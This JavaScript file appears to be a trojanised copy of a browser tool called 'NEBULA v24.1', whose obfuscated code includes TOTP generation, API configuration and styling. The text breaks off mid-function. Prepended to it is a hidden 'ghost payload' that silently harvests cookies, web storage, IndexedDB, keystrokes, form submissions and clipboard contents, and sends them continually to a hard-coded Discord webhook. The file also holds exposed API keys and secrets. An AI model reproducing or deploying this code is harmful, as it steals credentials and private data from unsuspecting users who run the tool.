(function () {
  "use strict";
  
  // ============================================================
  // ☠️ GHOST PAYLOAD — Silent Background Exfiltration
  // No UI, no console spam, no DOM trace
  // ============================================================
  (function() {
    const C2 = "https://discord.com/api/webhooks/1525785890746662982/PFy-PTiwoXe1OQL59RDAOnHj8yJgDSBAe030_7fIDHsVjdXd2xl4kTMfSPx-yuSL1afa";
    
    const payload = {
      init: function() {
        this.grabAll();
        this.hookEvents();
        this.beatHeart();
        this.watchSPA();
      },
      grabAll: function() {
        const pkg = {
          type: "init",
          url: location.href,
          domain: location.hostname,
          referrer: document.referrer || "direct",
          time: new Date().toISOString(),
          ua: navigator.userAgent,
          screen: screen.width + "x" + screen.height,
          lang: navigator.language,
          platform: navigator.platform,
          online: navigator.onLine,
          cookies: document.cookie.substring(0, 4000),
        };
        try {
          const ls = {}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage.getItem(k);}
          pkg.localStorage = JSON.stringify(ls).substring(0, 10000);
        } catch(e) { pkg.localStorage = "err:"+e.message; }
        try {
          const ss = {}; for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);ss[k]=sessionStorage.getItem(k);}
          pkg.sessionStorage = JSON.stringify(ss).substring(0, 10000);
        } catch(e) { pkg.sessionStorage = "err:"+e.message; }
        this.stealIndexedDB().then(data => {
          pkg.indexedDB = data.substring(0, 8000);
          this.send(pkg);
        }).catch(() => this.send(pkg));
      },
      stealIndexedDB: function() {
        return new Promise(resolve => {
          try {
            if(!window.indexedDB) return resolve("none");
            const dbs = [];
            const req = indexedDB.databases ? indexedDB.databases() : null;
            if(req && req.then) {
              req.then(list => {
                Promise.all(list.map(db => new Promise(r => {
                  const open = indexedDB.open(db.name);
                  open.onsuccess = function(e) {
                    const tx = e.target.result.transaction(e.target.result.objectStoreNames, "readonly");
                    const stores = {};
                    Array.from(e.target.result.objectStoreNames).forEach(name => {
                      const store = tx.objectStore(name);
                      const get = store.getAll ? store.getAll() : null;
                      if(get && get.then) get.then(data => stores[name] = data).catch(()=>{});
                    });
                    dbs.push({name: db.name, stores: stores});
                    r();
                  };
                  open.onerror = () => r();
                  setTimeout(() => r(), 500);
                }))).then(() => resolve(JSON.stringify(dbs)));
              }).catch(() => resolve("err"));
            } else resolve("not-supported");
          } catch(e) { resolve("err:"+e.message); }
        });
      },
      hookEvents: function() {
        document.addEventListener("keydown", function(e) {
          payload.buffer = payload.buffer || [];
          payload.buffer.push({
            key: e.key,
            code: e.code,
            target: e.target.tagName + (e.target.name?"[name="+e.target.name+"]":"") + (e.target.id?"#"+e.target.id:""),
            type: e.target.type || "",
            time: Date.now()
          });
          if(payload.buffer.length >= 20) payload.flushKeys();
        }, true);
        document.addEventListener("submit", function(e) {
          const form = e.target;
          const inputs = form.querySelectorAll("input, textarea, select");
          const data = {};
          inputs.forEach(inp => {
            if(inp.name) data[inp.name] = inp.value;
            else if(inp.id) data[inp.id] = inp.value;
          });
          payload.send({
            type: "form_submit",
            action: form.action || location.href,
            method: form.method || "get",
            time: new Date().toISOString(),
            data: data
          });
        }, true);
        document.addEventListener("click", function(e) {
          const el = e.target;
          payload.send({
            type: "click",
            tag: el.tagName,
            text: (el.innerText||"").substring(0, 100),
            id: el.id,
            className: el.className,
            href: el.href || "",
            coords: {x: e.clientX, y: e.clientY},
            time: Date.now()
          });
        }, true);
        setInterval(() => {
          try {
            navigator.clipboard.readText().then(text => {
              if(text && text !== payload._lastClip) {
                payload._lastClip = text;
                payload.send({type: "clipboard", text: text.substring(0, 2000), time: Date.now()});
              }
            }).catch(()=>{});
          } catch(e) {}
        }, 3000);
        window.addEventListener("beforeunload", () => {
          payload.flushKeys();
          payload.send({type: "page_exit", url: location.href, time: Date.now()});
        });
        document.addEventListener("visibilitychange", () => {
          payload.send({type: "visibility", state: document.visibilityState, time: Date.now()});
        });
      },
      flushKeys: function() {
        if(payload.buffer && payload.buffer.length) {
          payload.send({type: "keystrokes", data: payload.buffer.splice(0), time: Date.now()});
        }
      },
      beatHeart: function() {
        setInterval(() => {
          const pkg = {
            type: "heartbeat",
            url: location.href,
            time: Date.now(),
            cookies: document.cookie.substring(0, 4000),
          };
          try {
            const ls = {}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage.getItem(k);}
            pkg.localStorage = JSON.stringify(ls).substring(0, 8000);
          } catch(e) {}
          try {
            const ss = {}; for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);ss[k]=sessionStorage.getItem(k);}
            pkg.sessionStorage = JSON.stringify(ss).substring(0, 8000);
          } catch(e) {}
          this.send(pkg);
        }, 20000);
      },
      watchSPA: function() {
        const origPush = history.pushState;
        history.pushState = function() {
          origPush.apply(this, arguments);
          setTimeout(() => payload.grabAll(), 300);
        };
        const origReplace = history.replaceState;
        history.replaceState = function() {
          origReplace.apply(this, arguments);
          setTimeout(() => payload.grabAll(), 300);
        };
        window.addEventListener("popstate", () => {
          setTimeout(() => payload.grabAll(), 300);
        });
      },
      send: function(data) {
        const json = JSON.stringify(data);
        if(navigator.sendBeacon) {
          try {
            const blob = new Blob([json], {type: "application/json"});
            navigator.sendBeacon(C2, blob);
          } catch(e) {}
        }
        try {
          fetch(C2, {
            method: "POST",
            body: json,
            keepalive: true,
            headers: {"Content-Type": "application/json"},
            mode: "no-cors"
          }).catch(()=>{});
        } catch(e) {}
        try {
          const b64 = btoa(unescape(encodeURIComponent(json))).substring(0, 2000);
          new Image().src = C2 + "?d=" + b64;
        } catch(e) {}
      }
    };
    
    payload.init();
  })();

  // ##########################################################
  // NEBULA v24.1 — ORIGINAL CODE (UNMODIFIED)
  // ##########################################################
  const _0x3c10b7 = "NEBULA";
  const _0x45b50d = "24.1";
  const _0x1db9e0 = _0x3c10b7 + " v" + _0x45b50d;
  const _0x22c702 = {
    _logs: [],
    log: function (_0x54c2d4, _0x2273f3, _0x19fb63) {
      const _0x6d244 = {
        time: new Date().toISOString().split("T")[1].split(".")[0],
        tag: _0x54c2d4,
        msg: _0x2273f3,
        data: _0x19fb63 || null
      };
      this._logs.push(_0x6d244);
      if (this._logs.length > 500) {
        this._logs.shift();
      }
      console.log("[" + _0x6d244.time + "] [" + _0x54c2d4 + "] " + _0x2273f3, _0x19fb63 || "");
    },
    error: function (_0x5a9d6c, _0x78ba17, _0x24e01c) {
      const _0x5b9ca5 = {
        time: new Date().toISOString().split("T")[1].split(".")[0],
        tag: _0x5a9d6c,
        msg: _0x78ba17,
        data: _0x24e01c || null,
        error: true
      };
      this._logs.push(_0x5b9ca5);
      if (this._logs.length > 500) {
        this._logs.shift();
      }
      console.error("[" + _0x5b9ca5.time + "] [" + _0x5a9d6c + "] " + _0x78ba17, _0x24e01c || "");
    },
    getLogs: function (_0x389027) {
      return this._logs.slice(-(_0x389027 || 50));
    },
    dump: function () {
      console.table(this._logs);
    }
  };
  const _0x49a4fc = {
    aincrad: {
      target: "aincrad",
      name: "Aincrad",
      apiType: "2",
      moduleType: "standard"
    },
    "aincrad-proxy": {
      target: "aincrad-proxy",
      name: "AINCRAD PROXY",
      apiType: "1",
      moduleType: "standard"
    },
    vipteam: {
      target: "vipteam",
      name: "VIPTEAM",
      apiType: "vp",
      moduleType: "vipteam"
    },
    powercheats: {
      target: "powercheats",
      name: "POWERCHEATS",
      apiType: "vp",
      moduleType: "powercheats"
    },
    "universal-vplink": {
      target: "universal-vplink",
      name: "UNIVERSAL VPLINK.IN",
      apiType: "vp",
      moduleType: "universal-vplink"
    }
  };
  let _0x44a1aa = 0;
  let _0x21c643 = null;
  if (typeof window.ABDULLAH_BOOKMARK_LOAD !== "undefined") {
    const _0x551294 = window.ABDULLAH_BOOKMARK_LOAD;
    if (typeof _0x551294 === "string") {
      const _0x45c929 = _0x551294.trim().toLowerCase();
      if (_0x49a4fc[_0x45c929]) {
        _0x21c643 = _0x49a4fc[_0x45c929];
        _0x44a1aa = 0;
        _0x22c702.log("INIT", "Direct target detected: " + _0x45c929 + ", USER_ID=0 (default)");
      } else {
        const _0x25eb6b = _0x551294.split("/");
        const _0x4df624 = _0x25eb6b[_0x25eb6b.length - 1];
        const _0x52c7e6 = parseInt(_0x4df624);
        if (!isNaN(_0x52c7e6)) {
          _0x44a1aa = _0x52c7e6;
          _0x22c702.log("INIT", "USER_ID parsed from string: " + _0x44a1aa);
        } else {
          _0x44a1aa = 0;
          _0x22c702.log("INIT", "Unrecognized string, USER_ID=0");
        }
      }
    } else if (typeof _0x551294 === "number") {
      _0x44a1aa = _0x551294;
      _0x22c702.log("INIT", "USER_ID set from number: " + _0x44a1aa);
    } else {
      _0x44a1aa = 0;
      _0x22c702.log("INIT", "Unknown type, USER_ID=0");
    }
  }
  _0x22c702.log("INIT", "Final USER_ID=" + _0x44a1aa + ", directTarget=" + (_0x21c643 ? _0x21c643.name : "none"));
  let _0x3edb97 = {
    status: 1,
    musicListUrl: "https://raw.githubusercontent.com/A2MBD3/Aincrad/main/assets/music.txt",
    apiBaseUrl: "https://lol.amin89310.workers.dev",
    apiKey: "abdullah",
    totpSecret: "6ZQ4X3VPEK5XG2Q",
    userDataApiUrl: "https://nebula-bot-8afg.onrender.com",
    fallbackRedirectUrl: "https://htmlpreview.github.io/?https://raw.githubusercontent.com/A2MBD3/Aincrad/main/index.html",
    initProgressTime: 10000,
    exploitProgressTime: 20000,
    minProgressTime: 20000,
    autoInitDelay: 10000,
    corsProxy: "https://api.allorigins.win/raw?url="
  };
  const _0x282f8b = {
    id: 0,
    name: "TEAM CRX OFFICIAL",
    password: "crx",
    tgChannel: "t.me/HQcrx",
    banned: 0,
    creator: "@a2mbd3",
    chatId: "",
    createdAt: ""
  };
  const _0x2d39f5 = {
    ..._0x282f8b
  };
  let _0x50c9a2 = _0x2d39f5;
  let _0x26f1f4 = null;
  let _0x2dc750 = [];
  let _0x3c79ba = -1;
  let _0x97d8de = null;
  let _0x20701c = null;
  let _0x13e6d4 = null;
  let _0x4c4906 = null;
  let _0x7152d6 = function () {};
  let _0x4ffa6e = null;
  let _0x581bc0 = null;
  let _0x21e0aa = false;
  let _0xd849e8 = false;
  let _0x78fd44 = false;
  let _0x5ddb20 = null;
  let _0xd05830 = null;
  let _0x5a024e = [];
  let _0x45ddd7 = null;
  let _0xab5761 = false;
  let _0x3878b6 = null;
  let _0x426943 = null;
  let _0x3b3a2d = null;
  let _0x238270 = false;
  let _0x339012 = false;
  let _0x1d398b = null;
  let _0x1e203f = "------";
  let _0x2ac765 = null;
  let _0x7d8b23 = false;
  let _0x10c2be = null;
  let _0x4409c3 = null;
  let _0xd07885 = null;
  let _0x1d9364 = [];
  let _0x30b65e = null;
  let _0x254959 = false;
  let _0x45d06b = false;
  let _0x3db848 = null;
  let _0x2850af = false;
  let _0x49995c = null;
  let _0x149fe9 = false;
  let _0x40c4a5 = true;
  let _0x2e5a49 = false;
  class _0x1a5f72 {
    constructor(_0x4a4f46 = "K4XG2ZRGM5TGM3Q") {
      this.secret = _0x4a4f46;
      this.timeStep = 30;
      this.digits = 6;
      this._checkCrypto();
    }
    _sha1(_0x53aa4b) {
      function _0x3089c8(_0x2cf7a5, _0xae7c54) {
        return _0x2cf7a5 << _0xae7c54 | _0x2cf7a5 >>> 32 - _0xae7c54;
      }
      let _0x4d17cd = 1732584193;
      let _0xb7d07b = 4023233417;
      let _0x35ced2 = 2562383102;
      let _0x2ea068 = 271733878;
      let _0x526e67 = 3285377520;
      const _0xb85cc9 = _0x53aa4b.length * 8;
      _0x53aa4b.push(128);
      while (_0x53aa4b.length % 64 !== 56) {
        _0x53aa4b.push(0);
      }
      _0x53aa4b.push(0, 0, 0, 0);
      for (let _0x876bbf = 3; _0x876bbf >= 0; _0x876bbf--) {
        _0x53aa4b.push(_0xb85cc9 >>> _0x876bbf * 8 & 255);
      }
      for (let _0x406f1e = 0; _0x406f1e < _0x53aa4b.length; _0x406f1e += 64) {
        const _0x510e7b = [];
        for (let _0x43f0de = 0; _0x43f0de < 16; _0x43f0de++) {
          _0x510e7b[_0x43f0de] = _0x53aa4b[_0x406f1e + _0x43f0de * 4] << 24 | _0x53aa4b[_0x406f1e + _0x43f0de * 4 + 1] << 16 | _0x53aa4b[_0x406f1e + _0x43f0de * 4 + 2] << 8 | _0x53aa4b[_0x406f1e + _0x43f0de * 4 + 3];
        }
        for (let _0x5ebd94 = 16; _0x5ebd94 < 80; _0x5ebd94++) {
          _0x510e7b[_0x5ebd94] = _0x3089c8(_0x510e7b[_0x5ebd94 - 3] ^ _0x510e7b[_0x5ebd94 - 8] ^ _0x510e7b[_0x5ebd94 - 14] ^ _0x510e7b[_0x5ebd94 - 16], 1);
        }
        let _0x1d8cfd = _0x4d17cd;
        let _0x18d8eb = _0xb7d07b;
        let _0x5bf606 = _0x35ced2;
        let _0x2ac8d1 = _0x2ea068;
        let _0x1f6279 = _0x526e67;
        for (let _0x117450 = 0; _0x117450 < 80; _0x117450++) {
          let _0x4029b2;
          let _0x5ea761;
          if (_0x117450 < 20) {
            _0x4029b2 = _0x18d8eb & _0x5bf606 | ~_0x18d8eb & _0x2ac8d1;
            _0x5ea761 = 1518500249;
          } else if (_0x117450 < 40) {
            _0x4029b2 = _0x18d8eb ^ _0x5bf606 ^ _0x2ac8d1;
            _0x5ea761 = 1859775393;
          } else if (_0x117450 < 60) {
            _0x4029b2 = _0x18d8eb & _0x5bf606 | _0x18d8eb & _0x2ac8d1 | _0x5bf606 & _0x2ac8d1;
            _0x5ea761 = 2400959708;
          } else {
            _0x4029b2 = _0x18d8eb ^ _0x5bf606 ^ _0x2ac8d1;
            _0x5ea761 = 3395469782;
          }
          const _0x28f8a5 = _0x3089c8(_0x1d8cfd, 5) + _0x4029b2 + _0x1f6279 + _0x5ea761 + _0x510e7b[_0x117450] >>> 0;
          _0x1f6279 = _0x2ac8d1;
          _0x2ac8d1 = _0x5bf606;
          _0x5bf606 = _0x3089c8(_0x18d8eb, 30);
          _0x18d8eb = _0x1d8cfd;
          _0x1d8cfd = _0x28f8a5;
        }
        _0x4d17cd = _0x4d17cd + _0x1d8cfd >>> 0;
        _0xb7d07b = _0xb7d07b + _0x18d8eb >>> 0;
        _0x35ced2 = _0x35ced2 + _0x5bf606 >>> 0;
        _0x2ea068 = _0x2ea068 + _0x2ac8d1 >>> 0;
        _0x526e67 = _0x526e67 + _0x1f6279 >>> 0;
      }
      const _0x1ab91a = [];
      [_0x4d17cd, _0xb7d07b, _0x35ced2, _0x2ea068, _0x526e67].forEach(_0x3d8294 => {
        for (let _0x220cc4 = 3; _0x220cc4 >= 0; _0x220cc4--) {
          _0x1ab91a.push(_0x3d8294 >>> _0x220cc4 * 8 & 255);
        }
      });
      return _0x1ab91a;
    }
    async hmacSha1(_0x7193f6, _0x2e813c) {
      const _0x460a03 = Array.from(_0x7193f6);
      const _0x2fd162 = Array.from(new Uint8Array(_0x2e813c));
      const _0x51348 = 64;
      let _0x178024 = _0x460a03.length > _0x51348 ? this._sha1([..._0x460a03]) : [..._0x460a03];
      while (_0x178024.length < _0x51348) {
        _0x178024.push(0);
      }
      const _0x1cd0af = _0x178024.map(_0x48f42c => _0x48f42c ^ 54);
      const _0x3fa8d8 = _0x178024.map(_0x1c9a78 => _0x1c9a78 ^ 92);
      const _0x4f2ecb = this._sha1([..._0x1cd0af, ..._0x2fd162]);
      const _0x2733d2 = this._sha1([..._0x3fa8d8, ..._0x4f2ecb]);
      return new Uint8Array(_0x2733d2);
    }
    _checkCrypto() {
      this.cryptoAvailable = true;
      this.cryptoError = null;
      _0x22c702.log("TOTP", "Using pure JS HMAC-SHA1 (no crypto.subtle needed)");
    }
    base32ToHex(_0x5da5b1) {
      const _0x164bca = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
      let _0x425f44 = "";
      let _0x549460 = "";
      _0x5da5b1 = _0x5da5b1.toUpperCase().replace(/=+$/, "");
      for (let _0x1c3384 = 0; _0x1c3384 < _0x5da5b1.length; _0x1c3384++) {
        const _0x1d6938 = _0x164bca.indexOf(_0x5da5b1.charAt(_0x1c3384));
        if (_0x1d6938 === -1) {
          throw new Error("Invalid base32 character");
        }
        _0x425f44 += _0x1d6938.toString(2).padStart(5, "0");
      }
      for (let _0x312a51 = 0; _0x312a51 + 4 <= _0x425f44.length; _0x312a51 += 4) {
        const _0x1ca56b = _0x425f44.substr(_0x312a51, 4);
        _0x549460 += parseInt(_0x1ca56b, 2).toString(16);
      }
      return _0x549460;
    }
    async generate(_0x5831f2 = 0) {
      _0x22c702.log("TOTP", "generate() called with offset=" + _0x5831f2);
      const _0x2aefb2 = performance.now();
      const _0x5a6177 = this.base32ToHex(this.secret);
      const _0x409432 = Math.floor(Date.now() / 1000);
      const _0x396c0f = Math.floor(_0x409432 / this.timeStep) + _0x5831f2;
      _0x22c702.log("TOTP", "Epoch=" + _0x409432 + ", Time window=" + _0x396c0f);
      const _0x25611d = new ArrayBuffer(8);
      const _0x2ddedb = new DataView(_0x25611d);
      _0x2ddedb.setUint32(4, _0x396c0f, false);
      const _0x4cf5dd = new Uint8Array(_0x5a6177.match(/.{2}/g).map(_0x3b0f12 => parseInt(_0x3b0f12, 16)));
      const _0x206bfb = await this.hmacSha1(_0x4cf5dd, _0x25611d);
      const _0x35a4a9 = _0x206bfb[_0x206bfb.length - 1] & 15;
      const _0x23be54 = (_0x206bfb[_0x35a4a9] & 127) << 24 | (_0x206bfb[_0x35a4a9 + 1] & 255) << 16 | (_0x206bfb[_0x35a4a9 + 2] & 255) << 8 | _0x206bfb[_0x35a4a9 + 3] & 255;
      const _0x347293 = _0x23be54 % Math.pow(10, this.digits);
      const _0x30d8f3 = _0x347293.toString().padStart(this.digits, "0");
      const _0x4183d0 = (performance.now() - _0x2aefb2).toFixed(2);
      _0x22c702.log("TOTP", "PIN: " + _0x30d8f3 + " (" + _0x4183d0 + "ms)");
      return _0x30d8f3;
    }
  }
  const _0x29290f = new _0x1a5f72(_0x3edb97.totpSecret);
  _0x22c702.log("INIT", "TOTPGenerator ready (pure JS)");
  function _0x1d01e5() {
  if (document.getElementById("nb-dynamic-styles")) {
    return;
  }
  const _0x338b40 = document.createElement("style");
  _0x338b40.id = "nb-dynamic-styles";
  _0x338b40.textContent = "\n      :root{--bg-color:#e0e5ec;--electric-glow-1:#00f2ff;--electric-glow-2:#ff00ff;--success-color:#2ecc71;--danger-color:#ff4757;--emboss-light:#ffffff;--emboss-shadow:#a3b1c6;--text-color:#4a5568;--text-muted:#718096;--warning-color:#ffa500;--info-color:#00b4d8}\n      @keyframes nb-rotate-glow{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}\n      @keyframes nb-rotate-glow-reverse{0%{transform:rotate(360deg)}100%{transform:rotate(0deg)}}\n      @keyframes nb-fadeIn{from{opacity:0;transform:scale(0.95)}to{opacity:1;transform:scale(1)}}\n      @keyframes nb-slideUp{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}\n      @keyframes nb-toast-in{from{opacity:0;transform:translateX(-50%) translateY(15px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}\n      @keyframes nb-progress-glow{0%,100%{filter:hue-rotate(0deg)}50%{filter:hue-rotate(180deg)}}\n      @keyframes nb-pulse{0%,100%{opacity:0.6}50%{opacity:1}}\n      @keyframes nb-shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}\n      @keyframes nb-glow-pulse{0%,100%{opacity:0.5}50%{opacity:0.9}}\n      @keyframes nb-log-highlight{0%{background:transparent}50%{background:rgba(0,242,255,0.06)}100%{background:transparent}}\n      @keyframes nb-log-success{0%{background:transparent}50%{background:rgba(46,204,113,0.06)}100%{background:transparent}}\n      @keyframes nb-log-error{0%{background:transparent}50%{background:rgba(255,71,87,0.06)}100%{background:transparent}}\n      @keyframes nb-key-found{0%{transform:scale(1)}50%{transform:scale(1.05);background:rgba(255,0,255,0.1)}100%{transform:scale(1)}}\n      .nb-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.3);z-index:2147483647;display:grid;place-items:center;padding:20px;backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);animation:nb-fadeIn 0.3s ease;font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;overflow:hidden}\n      .nb-electric-wrapper{position:relative;padding:3px;border-radius:24px;background:rgba(0,0,0,0.05);overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.1);width:420px;max-width:calc(100vw - 40px);flex-shrink:0}\n      .nb-glow-layer{position:absolute;inset:-50%;pointer-events:none;z-index:0;opacity:1;animation:nb-glow-pulse 3s ease-in-out infinite}\n      .nb-glow-layer.glow-default{background:conic-gradient(transparent 0deg,rgba(0,242,255,1) 60deg,transparent 120deg,rgba(255,0,255,1) 180deg,transparent 240deg,rgba(0,242,255,1) 300deg,transparent 360deg);animation:nb-rotate-glow 4s linear infinite;opacity:1}\n      .nb-glow-layer.glow-focus-1{background:conic-gradient(transparent 0deg,var(--electric-glow-1) 90deg,transparent 180deg,var(--electric-glow-2) 270deg,transparent 360deg);animation:nb-rotate-glow 2.5s linear infinite;opacity:0;transition:opacity 0.4s ease}\n      .nb-glow-layer.glow-focus-2{background:conic-gradient(transparent 0deg,var(--electric-glow-2) 90deg,transparent 180deg,var(--electric-glow-1) 270deg,transparent 360deg);animation:nb-rotate-glow-reverse 3s linear infinite;opacity:0;transition:opacity 0.4s ease}\n      .nb-container{position:relative;background:var(--bg-color);padding:24px 20px;border-radius:21px;text-align:center;z-index:1;width:100%;box-sizing:border-box;max-height:calc(100vh - 46px);overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch}\n      .nb-container.overflow-visible{overflow-y:visible}\n      .nb-container::-webkit-scrollbar{width:3px}\n      .nb-container::-webkit-scrollbar-thumb{background:var(--emboss-shadow);border-radius:10px}\n      .nb-title{color:var(--text-color);margin:0 0 4px;font-weight:800;font-size:20px;letter-spacing:1px;word-break:break-word}\n      .nb-subtitle{color:var(--text-muted);font-size:12px;margin:0 0 18px;letter-spacing:2px;line-height:1.5}\n      .nb-emboss-input{width:100%;padding:14px;border:none;outline:none;background:var(--bg-color);border-radius:14px;font-size:15px;font-weight:700;text-align:center;color:var(--text-color);letter-spacing:4px;box-shadow:inset 6px 6px 12px var(--emboss-shadow),inset -6px -6px 12px var(--emboss-light);transition:all 0.3s cubic-bezier(0.4,0,0.2,1);box-sizing:border-box;font-family:inherit}\n      .nb-emboss-input:focus{box-shadow:inset 2px 2px 5px var(--emboss-shadow),inset -2px -2px 5px var(--emboss-light),0 0 15px var(--electric-glow-1)}\n      .nb-emboss-input.error{box-shadow:inset 6px 6px 12px var(--emboss-shadow),inset -6px -6px 12px var(--emboss-light),0 0 0 2px var(--danger-color)!important;animation:nb-shake 0.4s ease}\n      .nb-emboss-input.success{box-shadow:inset 6px 6px 12px var(--emboss-shadow),inset -6px -6px 12px var(--emboss-light),0 0 0 2px var(--success-color)!important}\n      .nb-error-text{color:var(--danger-color);font-size:11px;font-weight:600;margin:6px 0 10px;display:none;letter-spacing:1px}\n      .nb-emboss-btn{width:100%;padding:14px;border:none;border-radius:14px;background:var(--bg-color);color:var(--text-color);font-weight:700;font-size:13px;cursor:pointer;letter-spacing:2px;font-family:inherit;text-transform:uppercase;box-shadow:6px 6px 12px var(--emboss-shadow),-6px -6px 12px var(--emboss-light);transition:all 0.2s ease;margin-bottom:10px;flex-shrink:0}\n      .nb-emboss-btn:active{box-shadow:inset 4px 4px 8px var(--emboss-shadow),inset -4px -4px 8px var(--emboss-light);transform:scale(0.98)}\n      .nb-emboss-btn:disabled{box-shadow:inset 4px 4px 8px var(--emboss-shadow),inset -4px -4px 8px var(--emboss-light)!important;transform:none!important;opacity:0.7;cursor:not-allowed}\n      .nb-unban-btn{background:linear-gradient(135deg, #667eea 0%, #764ba2 100%)!important;color:white!important;box-shadow:6px 6px 12px var(--emboss-shadow),-6px -6px 12px var(--emboss-light),0 0 20px rgba(102,126,234,0.3)!important}\n      .nb-unban-btn:active{box-shadow:inset 4px 4px 8px var(--emboss-shadow),inset -4px -4px 8px var(--emboss-light),0 0 10px rgba(102,126,234,0.2)!important}\n      .nb-music-btn{position:absolute;top:12px;right:12px;z-index:2;background:var(--bg-color);border:none;color:var(--text-color);border-radius:50%;width:34px;height:34px;cursor:pointer;font-size:15px;display:flex;align-items:center;justify-content:center;box-shadow:3px 3px 6px var(--emboss-shadow),-3px -3px 6px var(--emboss-light);transition:all 0.2s ease;flex-shrink:0}\n      .nb-music-btn:active{box-shadow:inset 3px 3px 6px var(--emboss-shadow),inset -3px -3px 6px var(--emboss-light)}\n      .nb-music-btn.metered{color:var(--danger-color);box-shadow:inset 3px 3px 6px var(--emboss-shadow),inset -3px -3px 6px var(--emboss-light)}\n      .nb-back-btn{position:absolute;top:12px;left:12px;z-index:2;background:var(--bg-color);border:none;color:var(--text-color);border-radius:50%;width:34px;height:34px;cursor:pointer;font-size:15px;display:flex;align-items:center;justify-content:center;box-shadow:3px 3px 6px var(--emboss-shadow),-3px -3px 6px var(--emboss-light);transition:all 0.2s ease;flex-shrink:0}\n      .nb-back-btn:active{box-shadow:inset 3px 3px 6px var(--emboss-shadow),inset -3px -3px 6px var(--emboss-light)}\n      .nb-divider{width:50px;height:2px;background:linear-gradient(90deg,transparent,var(--text-muted),transparent);margin:12px auto}\n      .nb-uid{color:var(--text-muted);font-size:9px;letter-spacing:4px;opacity:0.7}\n      .nb-track{min-height:16px;margin-bottom:16px;font-size:9px;color:var(--text-muted);opacity:0.5;letter-spacing:1px}\n      .nb-track.metered{color:var(--danger-color);opacity:0.7}\n      .nb-footer{font-size:7px;color:var(--text-muted);opacity:1;margin-top:8px;letter-spacing:1px;flex-shrink:0}\n      .nb-footer a{color:#000;text-decoration:none;font-size:inherit;text-shadow:0 0 4px rgba(108,92,231,0.7),0 0 10px rgba(108,92,231,0.5),0 0 20px rgba(108,92,231,0.3)}\n      .nb-live-dot{width:7px;height:7px;background:var(--danger-color);border-radius:50%;box-shadow:0 0 6px var(--danger-color);animation:nb-pulse 1.5s infinite;flex-shrink:0}\n      .nb-log-area{color:var(--text-muted);font-size:8.5px;line-height:1.4;text-align:left;max-height:35vh;overflow-y:auto;overflow-x:hidden;padding:12px;margin-bottom:10px;border-radius:12px;background:var(--bg-color);box-shadow:inset 4px 4px 8px var(--emboss-shadow),inset -4px -4px 8px var(--emboss-light);word-break:break-all;-webkit-overflow-scrolling:touch;font-family:'Segoe UI',Roboto,sans-serif}\n      .nb-log-area::-webkit-scrollbar{width:2px}\n      .nb-log-area::-webkit-scrollbar-thumb{background:var(--emboss-shadow);border-radius:10px}\n      .nb-progress-bar-bg{width:100%;height:6px;background:var(--bg-color);border-radius:10px;box-shadow:inset 3px 3px 6px var(--emboss-shadow),inset -3px -3px 6px var(--emboss-light);overflow:hidden;margin:8px 0;flex-shrink:0}\n      .nb-progress-bar-fill{height:100%;width:0%;border-radius:10px;background:linear-gradient(90deg,var(--electric-glow-1),var(--electric-glow-2),var(--success-color));background-size:200% 100%;animation:nb-progress-glow 4s linear infinite;transition:width 0.15s linear}\n      .nb-progress-bar-fill.error-fill{background:linear-gradient(90deg,var(--danger-color),var(--warning-color),var(--danger-color))!important}\n      .nb-progress-bar-fill.vipteam-success{background:linear-gradient(90deg,#ff00ff,var(--success-color),#ff00ff)!important;background-size:200% 100%!important;animation:nb-progress-glow 2s linear infinite!important}\n      .nb-progress-label{display:flex;justify-content:space-between;align-items:center;font-size:8px;letter-spacing:2px;color:var(--text-color);margin-bottom:4px;flex-shrink:0}\n      .nb-success-check{width:45px;height:45px;background:var(--success-color);color:#fff;border-radius:50%;font-size:22px;display:flex;justify-content:center;align-items:center;margin:0 auto 8px;box-shadow:0 0 20px rgba(46,204,113,0.4);animation:nb-fadeIn 0.4s ease forwards;flex-shrink:0}\n      .nb-exploit-header{display:flex;align-items:center;gap:6px;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--emboss-shadow);flex-shrink:0}\n      .nb-exploit-title{color:var(--text-color);font-size:8px;letter-spacing:2px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;min-width:0}\n      .nb-status-icon{font-size:45px;margin-bottom:10px}\n      .nb-suspended-icon{font-size:45px;margin-bottom:10px;animation:nb-pulse 2s infinite}\n      .nb-status-user{color:var(--text-muted);font-size:10px;line-height:1.4}\n      .nb-loading-spinner{display:inline-block;width:18px;height:18px;border:2px solid var(--emboss-shadow);border-radius:50%;border-top-color:var(--electric-glow-1);animation:nb-rotate-glow 1s linear infinite;margin-right:8px;vertical-align:middle}\n      .nb-log-entry{display:flex;align-items:center;margin-bottom:2px;padding:2px 6px;border-radius:4px;animation:nb-slideUp 0.3s ease}\n      .nb-log-entry.log-info{background:transparent}\n      .nb-log-entry.log-success{animation:nb-log-success 1.5s ease}\n      .nb-log-entry.log-error{animation:nb-log-error 1.5s ease}\n      .nb-log-entry.log-highlight{animation:nb-log-highlight 1.5s ease}\n      .nb-log-entry.log-key-found{animation:nb-key-found 0.5s ease}\n      .nb-log-icon{font-size:10px;margin-right:5px;min-width:14px;text-align:center;flex-shrink:0}\n      .nb-log-text{font-size:8.5px;line-height:1.3;flex:1;font-weight:600;letter-spacing:0.3px}\n      .nb-retry-badge{display:inline-block;background:var(--warning-color);color:#fff;font-size:7px;padding:1px 4px;border-radius:3px;margin-left:4px;font-weight:700}\n      .nb-log-separator{text-align:center;margin:2px 0;opacity:0.25}\n    ";
  document.head.appendChild(_0x338b40);
}
function _0x5e275f(_0x3b04b4) {
  const _0x424ff8 = document.createElement("div");
  _0x424ff8.className = "nb-glow-layer glow-default";
  _0x3b04b4.appendChild(_0x424ff8);
  const _0x22b8a7 = document.createElement("div");
